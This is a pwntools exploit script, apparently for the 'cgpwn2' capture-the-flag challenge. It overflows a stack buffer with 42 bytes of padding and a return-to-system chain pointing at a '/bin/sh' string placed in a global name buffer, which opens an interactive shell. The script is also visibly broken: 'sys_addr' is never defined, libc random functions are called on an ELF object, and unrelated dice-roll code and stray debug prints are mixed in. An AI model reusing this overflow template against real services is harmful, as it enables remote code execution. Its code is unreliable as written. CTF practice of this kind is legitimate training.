#!/usr/bin/env python
# coding: utf-8

from pwn import *

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0


r      = lambda x: p.recv(x)
ru     = lambda x: p.recvuntil(x)
rud    = lambda x: p.recvuntil(x, drop=True)
se     = lambda x: p.send(x)
sel    = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

if DEBUG:
    
    context.terminal = ['tmux','splitw','-h']
    context.log_level = 'debug'
    elf=ELF("./cgpwn2")
    p = process('./cgpwn2')
    #libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF("./libc.so.6")

    #p = remote("111.198.29.45", 30010, timeout=3)
    print("123")
    a=libc.srand(0xa)
    print hex(a)
    for i in xrange(50):
        b=libc.rand()%6 + 1
        print b

    ru("name: ")
    print "11111"
    payload="/bin/sh\0"
    sel(payload)

    payload="A"*42+p32(sys_addr)+p32(0x1234)+p32(0x0804a080)
    #gdb.attach(p,"b *0x080485fc")
    #pause()
    sel(payload)#   ru("you!")
    print "over"
 

    p.interactive()


